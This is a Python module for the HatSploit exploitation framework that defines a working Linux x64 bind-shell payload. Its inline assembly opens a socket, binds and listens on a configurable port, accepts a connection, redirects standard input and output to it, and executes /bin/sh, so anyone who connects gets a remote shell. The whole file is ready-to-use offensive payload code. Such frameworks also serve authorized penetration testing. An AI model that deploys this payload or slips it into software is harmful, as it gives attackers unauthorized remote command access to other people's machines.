"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.payload import Payload
from pex.assembler import Assembler
from pex.socket import Socket


class HatSploitPayload(Payload, Assembler, Socket):
    details = {
        'Name': "Linux x64 Shell Bind TCP",
        'Payload': "linux/x64/shell_bind_tcp",
        'Authors': ['Ivan Nikolsky (enty8080) - payload developer'],
        'Description': "Shell bind TCP payload for Linux x64.",
        'Architecture': "x64",
        'Platform': "linux",
        'Rank': "high",
        'Type': "bind_tcp",
    }

    def run(self):
        bport = self.pack_port(self.handler['BPORT'])

        return self.assemble(
            self.details['Architecture'],
            f"""
            start:
                push 0x29
                pop rax
                cdq
                push 0x2
                pop rdi
                push 0x1
                pop rsi
                syscall

                xchg rdi, rax
                push rdx
                mov dword ptr [rsp], 0x{bport.hex()}0002
                mov rsi, rsp
                push 0x10
                pop rdx
                push 0x31
                pop rax
                syscall

                push 0x32
                pop rax
                syscall

                xor rsi, rsi
                push 0x2b
                pop rax
                syscall

                xchg rdi, rax
                push 0x3
                pop rsi

            dup:
                dec rsi
                push 0x21
                pop rax
                syscall

                jne dup
                push 0x3b
                pop rax
                cdq
                movabs rbx, 0x68732f6e69622f
                push rbx
                mov rdi, rsp
                push rdx
                push rdi
                mov rsi, rsp
                syscall
            """
        )
